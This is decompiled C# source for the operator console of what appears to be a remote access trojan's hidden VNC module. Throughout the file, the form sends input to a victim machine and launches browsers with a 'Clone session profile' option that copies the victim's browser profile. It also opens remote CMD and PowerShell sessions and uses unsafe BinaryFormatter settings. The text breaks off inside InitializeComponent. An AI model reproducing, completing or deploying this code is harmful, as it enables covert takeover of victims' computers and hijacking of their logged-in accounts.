using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.Utils.Svg;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.CompilerServices;
using Server.Connection;

namespace Server.Forms;

public class FrmVNC : XtraForm
{
	private int int_0;

	public int total_size;

	private bool bool_1;

	private bool bool_2;

	public TcpClient client;

	public Clients main_client;

	private IContainer components;

	private System.Windows.Forms.Timer timer1;

	private Label ResizeLabel;

	private Label QualityLabel;

	private Label IntervalLabel;

	private PictureBox VNCBox;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private ToolStripStatusLabel toolStripStatusLabel2;

	private System.Windows.Forms.Timer timer2;

	private TrackBarControl IntervalScroll;

	private TrackBarControl QualityScroll;

	private TrackBarControl ResizeScroll;

	private CheckEdit chkClone;

	private SimpleButton simpleButton2;

	private SimpleButton simpleButton4;

	private SimpleButton simpleButton3;

	private SimpleButton simpleButton5;

	private SimpleButton simpleButton6;

	private SimpleButton simpleButton9;

	private SimpleButton simpleButton10;

	private SimpleButton simpleButton11;

	private SimpleButton simpleButton12;

	public ProgressBarControl DuplicateProgess;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private PanelControl panelControl2;

	private SimpleButton CloseBtn;

	private PanelControl panelControl1;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel LabelStatus;

	private PanelControl panelControl3;

	public PictureBox VNCBoxe
	{
		get
		{
			return VNCBox;
		}
		set
		{
			VNCBox = value;
		}
	}

	public ToolStripStatusLabel _LabelStatus
	{
		get
		{
			return LabelStatus;
		}
		set
		{
			LabelStatus = value;
		}
	}

	public void DuplicateProfile(int copied)
	{
		if (total_size != 0)
		{
			if (copied > total_size)
			{
				copied = total_size;
			}
			int num = (int)(100.0 * ((double)copied / (double)total_size));
			LabelStatus.Text = $"[{num} %] Copying {copied} / {total_size} MB ";
			DuplicateProgess.Position = num;
		}
	}

	public FrmVNC()
	{
		int_0 = 0;
		bool_1 = true;
		bool_2 = false;
		InitializeComponent();
		VNCBox.MouseEnter += VNCBox_MouseEnter;
		VNCBox.MouseLeave += VNCBox_MouseLeave;
		VNCBox.KeyPress += VNCBox_KeyPress;
	}

	private void VNCBox_MouseEnter(object sender, EventArgs e)
	{
		VNCBox.Focus();
	}

	private void VNCBox_MouseLeave(object sender, EventArgs e)
	{
		FindForm().ActiveControl = null;
	}

	private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
	{
		SendTCP("7*" + Conversions.ToString(e.KeyChar));
	}

	private void VNCForm_Load(object sender, EventArgs e)
	{
		VNCBox.Tag = new Size(1028, 1028);
		SendTCP("0*");
		SendTCP("17*" + Conversions.ToString(IntervalScroll.Value));
		SendTCP("18*" + Conversions.ToString(QualityScroll.Value));
		SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0));
		LabelStatus.Text = "Ready...";
	}

	public void Check()
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		checked
		{
			int_0 += 100;
			if (int_0 >= SystemInformation.DoubleClickTime)
			{
				bool_1 = true;
				bool_2 = false;
				int_0 = 0;
			}
		}
	}

	private void CopyBtn_Click(object sender, EventArgs e)
	{
		SendTCP("9*");
		LabelStatus.Text = "Copied...";
	}

	private void PasteBtn_Click(object sender, EventArgs e)
	{
		try
		{
			SendTCP("10*" + Clipboard.GetText());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		LabelStatus.Text = "Pasted...";
	}

	private void VNCBox_MouseDown(object sender, MouseEventArgs e)
	{
		if (bool_1)
		{
			bool_1 = false;
			timer1.Start();
		}
		else if (int_0 < SystemInformation.DoubleClickTime)
		{
			bool_2 = true;
		}
		Point location = e.Location;
		object tag = VNCBox.Tag;
		Size size = ((tag != null) ? ((Size)tag) : default(Size));
		double num = (double)VNCBox.Width / (double)size.Width;
		double num2 = (double)VNCBox.Height / (double)size.Height;
		double num3 = Math.Ceiling((double)location.X / num);
		double num4 = Math.Ceiling((double)location.Y / num2);
		if (bool_2)
		{
			if (e.Button == MouseButtons.Left)
			{
				SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
			}
		}
		else if (e.Button == MouseButtons.Left)
		{
			SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
		}
		else if (e.Button == MouseButtons.Right)
		{
			SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
		}
	}

	private void VNCBox_MouseUp(object sender, MouseEventArgs e)
	{
		Point location = e.Location;
		object tag = VNCBox.Tag;
		Size size = ((tag != null) ? ((Size)tag) : default(Size));
		double num = (double)VNCBox.Width / (double)size.Width;
		double num2 = (double)VNCBox.Height / (double)size.Height;
		double num3 = Math.Ceiling((double)location.X / num);
		double num4 = Math.Ceiling((double)location.Y / num2);
		if (e.Button == MouseButtons.Left)
		{
			SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
		}
		else if (e.Button == MouseButtons.Right)
		{
			SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
		}
	}

	private void VNCBox_MouseMove(object sender, MouseEventArgs e)
	{
		Point location = e.Location;
		object tag = VNCBox.Tag;
		Size size = ((tag != null) ? ((Size)tag) : default(Size));
		double num = (double)VNCBox.Width / (double)size.Width;
		double num2 = (double)VNCBox.Height / (double)size.Height;
		double num3 = Math.Ceiling((double)location.X / num);
		double num4 = Math.Ceiling((double)location.Y / num2);
		SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4));
	}

	private void IntervalScroll_Scroll(object sender, EventArgs e)
	{
		IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
		SendTCP("17*" + Conversions.ToString(IntervalScroll.Value));
	}

	private void QualityScroll_Scroll(object sender, EventArgs e)
	{
		QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
		SendTCP("18*" + Conversions.ToString(QualityScroll.Value));
	}

	private void ResizeScroll_Scroll(object sender, EventArgs e)
	{
		ResizeLabel.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
		SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0));
	}

	private void RestoreMaxBtn_Click(object sender, EventArgs e)
	{
		SendTCP("15*");
	}

	private void MinBtn_Click(object sender, EventArgs e)
	{
		SendTCP("14*");
	}

	private void CloseBtn_Click(object sender, EventArgs e)
	{
		SendTCP("16*");
	}

	private void StartExplorer_Click(object sender, EventArgs e)
	{
		SendTCP("21*");
		LabelStatus.Text = "Showing Windows Explorer...";
	}

	private void StartBrowserBtn_Click(object sender, EventArgs e)
	{
		SendTCP("11*" + Conversions.ToString(chkClone.Checked));
		LabelStatus.Text = $"Starting Chrome[Cloning {chkClone.Checked}]...";
	}

	private void SendTCP(object object_0)
	{
		if (client == null)
		{
			return;
		}
		checked
		{
			try
			{
				lock (client)
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					object objectValue = RuntimeHelpers.GetObjectValue(object_0);
					ulong num = 0uL;
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					num = (ulong)memoryStream.Position;
					client.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					client.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
	{
		SendTCP("7*" + Conversions.ToString(e.KeyChar));
	}

	private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "HVNCStop";
		ThreadPool.QueueUserWorkItem(main_client.Send, msgPack.Encode2Bytes());
		Hide();
		e.Cancel = true;
	}

	private void VNCForm_Click(object sender, EventArgs e)
	{
		method_18(null);
	}

	private void method_18(object object_0)
	{
		base.ActiveControl = (Control)object_0;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (chkClone.Checked)
		{
			SendTCP("30*" + Conversions.ToString(Value: true));
		}
		else
		{
			SendTCP("30*" + Conversions.ToString(Value: false));
		}
		LabelStatus.Text = $"Starting Edge[Cloning {chkClone.Checked}]...";
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (chkClone.Checked)
		{
			SendTCP("12*" + Conversions.ToString(Value: true));
		}
		else
		{
			SendTCP("12*" + Conversions.ToString(Value: false));
		}
		LabelStatus.Text = $"Starting FireFox[Cloning {chkClone.Checked}]...";
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		Check();
	}

	private void button4_Click(object sender, EventArgs e)
	{
		SendTCP($"32*{chkClone.Checked}");
		LabelStatus.Text = $"Starting Brave[Cloning {chkClone.Checked}]...";
	}

	private void button7_Click(object sender, EventArgs e)
	{
		SendTCP("4875*");
		LabelStatus.Text = "Runnig Command Prompt...";
	}

	private void button8_Click(object sender, EventArgs e)
	{
		SendTCP("4876*");
		LabelStatus.Text = "Runnig PowerShell...";
	}

	private void VNCBox_Click(object sender, EventArgs e)
	{
	}

	private void VNCBox_MouseHover(object sender, EventArgs e)
	{
		VNCBox.Focus();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FrmVNC));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.ResizeLabel = new System.Windows.Forms.Label();
		this.QualityLabel = new System.Windows.Forms.Label();
		this.IntervalLabel = new System.Windows.Forms.Label();
		this.VNCBox = new System.Windows.Forms.PictureBox();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.timer2 = new System.Windows.Forms.Timer(this.components);
		this.chkClone = new DevExpress.XtraEditors.CheckEdit();
		this.ResizeScroll = new DevExpress.XtraEditors.TrackBarControl();
		this.QualityScroll = new DevExpress.XtraEditors.TrackBarControl();
		this.IntervalScroll = new DevExpress.XtraEditors.TrackBarControl();
		this.DuplicateProgess = new DevExpress.XtraEditors.ProgressBarControl();
		this.simpleButton9 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton10 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton11 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton12 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton6 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton5 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton4 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton3 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton2 = new DevExpress.XtraEditors.SimpleButton();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.panelControl2 = new DevExpress.XtraEditors.PanelControl();
		this.CloseBtn = new DevExpress.XtraEditors.SimpleButton();
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.LabelStatus = new System.Windows.Forms.ToolStripStatusLabel();
		this.panelControl3 = new DevExpress.XtraEditors.PanelControl();
		((System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.chkClone.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.ResizeScroll).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.ResizeScroll.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.QualityScroll).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.QualityScroll.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.IntervalScroll).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.IntervalScroll.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DuplicateProgess.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).BeginInit();
		this.panelControl2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl3).BeginInit();
		this.panelControl3.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.ResizeLabel.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.ResizeLabel.AutoSize = true;
		this.ResizeLabel.Location = new System.Drawing.Point(773, 11);
		this.ResizeLabel.Name = "ResizeLabel";
		this.ResizeLabel.Size = new System.Drawing.Size(71, 13);
		this.ResizeLabel.TabIndex = 4;
		this.ResizeLabel.Text = "Resize : 55%";
		this.QualityLabel.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.QualityLabel.AutoSize = true;
		this.QualityLabel.Location = new System.Drawing.Point(588, 11);
		this.QualityLabel.Name = "QualityLabel";
		this.QualityLabel.Size = new System.Drawing.Size(74, 13);
		this.QualityLabel.TabIndex = 5;
		this.QualityLabel.Text = "Quality : 50%";
		this.IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.IntervalLabel.AutoSize = true;
		this.IntervalLabel.Location = new System.Drawing.Point(391, 147);
		this.IntervalLabel.Name = "IntervalLabel";
		this.IntervalLabel.Size = new System.Drawing.Size(94, 13);
		this.IntervalLabel.TabIndex = 6;
		this.IntervalLabel.Text = "Interval (ms): 500";
		this.IntervalLabel.Visible = false;
		this.VNCBox.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
		this.VNCBox.Location = new System.Drawing.Point(0, 37);
		this.VNCBox.Name = "VNCBox";
		this.VNCBox.Size = new System.Drawing.Size(958, 395);
		this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.VNCBox.TabIndex = 7;
		this.VNCBox.TabStop = false;
		this.VNCBox.Click += new System.EventHandler(VNCBox_Click);
		this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
		this.VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
		this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
		this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
		this.toolStripStatusLabel1.Text = "Statut :";
		this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
		this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
		this.toolStripStatusLabel2.Text = "Idle";
		this.timer2.Enabled = true;
		this.timer2.Interval = 1000;
		this.timer2.Tick += new System.EventHandler(timer2_Tick);
		this.chkClone.Dock = System.Windows.Forms.DockStyle.Right;
		this.chkClone.Location = new System.Drawing.Point(824, 2);
		this.chkClone.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkClone.Name = "chkClone";
		this.chkClone.Properties.Caption = "Clone session profile";
		this.chkClone.Size = new System.Drawing.Size(134, 22);
		this.chkClone.TabIndex = 30;
		this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.ResizeScroll.EditValue = 50;
		this.ResizeScroll.Location = new System.Drawing.Point(850, 3);
		this.ResizeScroll.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.ResizeScroll.Name = "ResizeScroll";
		this.ResizeScroll.Properties.LabelAppearance.Options.UseTextOptions = true;
		this.ResizeScroll.Properties.LabelAppearance.TextOptions.HAlignment = DevExpress.Utils.HorzAlignment.Center;
		this.ResizeScroll.Properties.LargeChange = 100;
		this.ResizeScroll.Properties.Maximum = 100;
		this.ResizeScroll.Properties.Minimum = 10;
		this.ResizeScroll.Properties.ShowLabels = true;
		this.ResizeScroll.Properties.SmallChange = 50;
		this.ResizeScroll.Properties.TickFrequency = 10;
		this.ResizeScroll.Properties.TickStyle = System.Windows.Forms.TickStyle.None;
		this.ResizeScroll.Size = new System.Drawing.Size(100, 45);
		this.ResizeScroll.TabIndex = 35;
		this.ResizeScroll.Value = 50;
		this.ResizeScroll.Scroll += new System.EventHandler(ResizeScroll_Scroll);
		this.QualityScroll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.QualityScroll.EditValue = 50;
		this.QualityScroll.Location = new System.Drawing.Point(667, 3);
		this.QualityScroll.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.QualityScroll.Name = "QualityScroll";
		this.QualityScroll.Properties.LabelAppearance.Options.UseTextOptions = true;
		this.QualityScroll.Properties.LabelAppearance.TextOptions.HAlignment = DevExpress.Utils.HorzAlignment.Center;
		this.QualityScroll.Properties.LargeChange = 100;
		this.QualityScroll.Properties.Maximum = 100;
		this.QualityScroll.Properties.Minimum = 10;
		this.QualityScroll.Properties.ShowLabels = true;
		this.QualityScroll.Properties.SmallChange = 50;
		this.QualityScroll.Properties.TickFrequency = 10;
		this.QualityScroll.Properties.TickStyle = System.Windows.Forms.TickStyle.None;
		this.QualityScroll.Size = new System.Drawing.Size(100, 45);
		this.QualityScroll.TabIndex = 34;
		this.QualityScroll.Value = 50;
		this.QualityScroll.Scroll += new System.EventHandler(QualityScroll_Scroll);
		this.IntervalScroll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.IntervalScroll.EditValue = 500;
		this.IntervalScroll.Location = new System.Drawing.Point(488, 136);
		this.IntervalScroll.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.IntervalScroll.Name = "IntervalScroll";
		this.IntervalScroll.Properties.LabelAppearance.Options.UseTextOptions = true;
		this.IntervalScroll.Properties.LabelAppearance.TextOptions.HAlignment = DevExpress.Utils.HorzAlignment.Center;
		this.IntervalScroll.Properties.LargeChange = 100;
		this.IntervalScroll.Properties.Maximum = 1000;
		this.IntervalScroll.Properties.Minimum = 10;
		this.IntervalScroll.Properties.ShowLabels = true;
		this.IntervalScroll.Properties.SmallChange = 50;
		this.IntervalScroll.Properties.TickFrequency = 100;
		this.IntervalScroll.Properties.TickStyle = System.Windows.Forms.TickStyle.Both;
		this.IntervalScroll.Size = new System.Drawing.Size(100, 45);
		this.IntervalScroll.TabIndex = 33;
		this.IntervalScroll.Value = 500;
		this.IntervalScroll.Visible = false;
		this.IntervalScroll.Scroll += new System.EventHandler(IntervalScroll_Scroll);
		this.DuplicateProgess.EditValue = 1;
		this.DuplicateProgess.Location = new System.Drawing.Point(207, 321);
		this.DuplicateProgess.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DuplicateProgess.Name = "DuplicateProgess";
		this.DuplicateProgess.Properties.Appearance.BackColor = System.Drawing.Color.Red;
		this.DuplicateProgess.Properties.Appearance.BackColor2 = System.Drawing.Color.Red;
		this.DuplicateProgess.Properties.Appearance.BorderColor = System.Drawing.Color.Red;
		this.DuplicateProgess.Properties.Appearance.ForeColor = System.Drawing.Color.Red;
		this.DuplicateProgess.Properties.Appearance.ForeColor2 = System.Drawing.Color.Red;
		this.DuplicateProgess.Size = new System.Drawing.Size(127, 15);
		this.DuplicateProgess.TabIndex = 36;
		this.simpleButton9.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton9.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton9.ImageOptions.Image");
		this.simpleButton9.Location = new System.Drawing.Point(178, 2);
		this.simpleButton9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton9.Name = "simpleButton9";
		this.simpleButton9.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton9.Size = new System.Drawing.Size(88, 29);
		this.simpleButton9.TabIndex = 3;
		this.simpleButton9.Text = "Firefox";
		this.simpleButton9.Click += new System.EventHandler(button2_Click);
		this.simpleButton10.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton10.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton10.ImageOptions.Image");
		this.simpleButton10.Location = new System.Drawing.Point(90, 2);
		this.simpleButton10.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton10.Name = "simpleButton10";
		this.simpleButton10.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton10.Size = new System.Drawing.Size(88, 29);
		this.simpleButton10.TabIndex = 2;
		this.simpleButton10.Text = "Edge";
		this.simpleButton10.Click += new System.EventHandler(button1_Click);
		this.simpleButton11.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton11.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton11.ImageOptions.Image");
		this.simpleButton11.Location = new System.Drawing.Point(266, 2);
		this.simpleButton11.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton11.Name = "simpleButton11";
		this.simpleButton11.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton11.Size = new System.Drawing.Size(88, 29);
		this.simpleButton11.TabIndex = 1;
		this.simpleButton11.Text = "Brave";
		this.simpleButton11.Click += new System.EventHandler(button4_Click);
		this.simpleButton12.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton12.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton12.ImageOptions.Image");
		this.simpleButton12.Location = new System.Drawing.Point(2, 2);
		this.simpleButton12.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton12.Name = "simpleButton12";
		this.simpleButton12.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton12.Size = new System.Drawing.Size(88, 29);
		this.simpleButton12.TabIndex = 0;
		this.simpleButton12.Text = "Chrome";
		this.simpleButton12.Click += new System.EventHandler(StartBrowserBtn_Click);
		this.simpleButton6.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton6.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton6.ImageOptions.Image");
		this.simpleButton6.Location = new System.Drawing.Point(71, 2);
		this.simpleButton6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton6.Name = "simpleButton6";
		this.simpleButton6.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton6.Size = new System.Drawing.Size(69, 33);
		this.simpleButton6.TabIndex = 5;
		this.simpleButton6.Text = "Paste";
		this.simpleButton6.Click += new System.EventHandler(PasteBtn_Click);
		this.simpleButton5.Dock = System.Windows.Forms.DockStyle.Left;
		this.simpleButton5.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton5.ImageOptions.Image");
		this.simpleButton5.Location = new System.Drawing.Point(2, 2);
		this.simpleButton5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton5.Name = "simpleButton5";
		this.simpleButton5.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton5.Size = new System.Drawing.Size(69, 33);
		this.simpleButton5.TabIndex = 4;
		this.simpleButton5.Text = "Copy";
		this.simpleButton5.Click += new System.EventHandler(CopyBtn_Click);
		this.simpleButton4.Dock = System.Windows.Forms.DockStyle.Right;
		this.simpleButton4.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton4.ImageOptions.Image");
		this.simpleButton4.Location = new System.Drawing.Point(641, 2);
		this.simpleButton4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton4.Name = "simpleButton4";
		this.simpleButton4.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton4.Size = new System.Drawing.Size(99, 29);
		this.simpleButton4.TabIndex = 3;
		this.simpleButton4.Text = "PowerShell";
		this.simpleButton4.Click += new System.EventHandler(button8_Click);
		this.simpleButton3.Dock = System.Windows.Forms.DockStyle.Right;
		this.simpleButton3.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton3.ImageOptions.Image");
		this.simpleButton3.Location = new System.Drawing.Point(740, 2);
		this.simpleButton3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton3.Name = "simpleButton3";
		this.simpleButton3.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton3.Size = new System.Drawing.Size(69, 29);
		this.simpleButton3.TabIndex = 2;
		this.simpleButton3.Text = "CMD";
		this.simpleButton3.Click += new System.EventHandler(button7_Click);
		this.simpleButton2.Dock = System.Windows.Forms.DockStyle.Right;
		this.simpleButton2.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("simpleButton2.ImageOptions.Image");
		this.simpleButton2.Location = new System.Drawing.Point(809, 2);
		this.simpleButton2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.simpleButton2.Name = "simpleButton2";
		this.simpleButton2.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.simpleButton2.Size = new System.Drawing.Size(83, 29);
		this.simpleButton2.TabIndex = 1;
		this.simpleButton2.Text = "Explorer";
		this.simpleButton2.Click += new System.EventHandler(StartExplorer_Click);
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(960, 496);
		this.xtraTabControl1.TabIndex = 37;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.VNCBox);
		this.xtraTabPage1.Controls.Add(this.DuplicateProgess);
		this.xtraTabPage1.Controls.Add(this.panelControl2);
		this.xtraTabPage1.Controls.Add(this.IntervalLabel);
		this.xtraTabPage1.Controls.Add(this.panelControl1);
		this.xtraTabPage1.Controls.Add(this.IntervalScroll);
		this.xtraTabPage1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(958, 465);
		this.panelControl2.Controls.Add(this.simpleButton4);
		this.panelControl2.Controls.Add(this.simpleButton3);
		this.panelControl2.Controls.Add(this.simpleButton11);
		this.panelControl2.Controls.Add(this.simpleButton9);
		this.panelControl2.Controls.Add(this.simpleButton10);
		this.panelControl2.Controls.Add(this.simpleButton12);
		this.panelControl2.Controls.Add(this.simpleButton2);
		this.panelControl2.Controls.Add(this.CloseBtn);
		this.panelControl2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelControl2.Location = new System.Drawing.Point(0, 432);
		this.panelControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl2.Name = "panelControl2";
		this.panelControl2.Size = new System.Drawing.Size(958, 33);
		this.panelControl2.TabIndex = 42;
		this.CloseBtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.CloseBtn.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.ImageOptions.Image");
		this.CloseBtn.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleLeft;
		this.CloseBtn.Location = new System.Drawing.Point(892, 2);
		this.CloseBtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.CloseBtn.Name = "CloseBtn";
		this.CloseBtn.PaintStyle = DevExpress.XtraEditors.Controls.PaintStyles.Light;
		this.CloseBtn.Size = new System.Drawing.Size(64, 29);
		this.CloseBtn.TabIndex = 39;
		this.CloseBtn.Text = "Close";
		this.CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
		this.panelControl1.Controls.Add(this.simpleButton6);
		this.panelControl1.Controls.Add(this.ResizeScroll);
		this.panelControl1.Controls.Add(this.simpleButton5);
		this.panelControl1.Controls.Add(this.ResizeLabel);
		this.panelControl1.Controls.Add(this.QualityScroll);
		this.panelControl1.Controls.Add(this.QualityLabel);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl1.Location = new System.Drawing.Point(0, 0);
		this.panelControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(958, 37);
